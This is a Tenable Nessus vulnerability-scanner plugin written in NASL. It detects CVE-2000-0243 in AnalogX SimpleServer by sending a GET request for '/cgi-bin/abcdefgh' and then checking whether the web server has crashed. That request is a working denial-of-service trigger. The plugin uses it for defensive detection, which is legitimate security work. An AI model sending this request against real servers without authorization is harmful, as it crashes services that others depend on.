#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(10366);
  script_version("1.36");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2000-0243");
  script_bugtraq_id(1076);

  script_name(english:"AnalogX SimpleServer:WWW Short GET /cgi-bin Remote DoS");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a remote denial of service
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of the AnalogX SimpleServer web
server that is affected by a remote denial of service vulnerability. 
An attacker could exploit this vulnerability to crash the affected
application by requesting a URL with exactly 8 characters following
the '/cgi-bin/' directory.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2000/Mar/314");
  script_set_attribute(attribute:"solution", value:
"Upgrading to SimpleServer 1.0.4 or newer reportedly fixes the issue.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2000/03/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2000/04/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:analogx:simpleserver_www");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2000-2022 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

 port = get_http_port(default:80);

if (report_paranoia < 2)
{
  banner = get_http_banner(port:port, exit_on_fail: 1);
  if ( "AnalogX Simple Server" >!< banner )
    exit(0, "The web server on port "+port+" is not AnalogX.");
}

if (http_is_dead(port: port))
  exit(1, "The web server on port "+port+" is already dead.");

r = http_send_recv3(method:"GET", item:"/cgi-bin/abcdefgh", port:port);
sleep(5);
if (http_is_dead(port: port, retry: 3))
  security_warning(port);
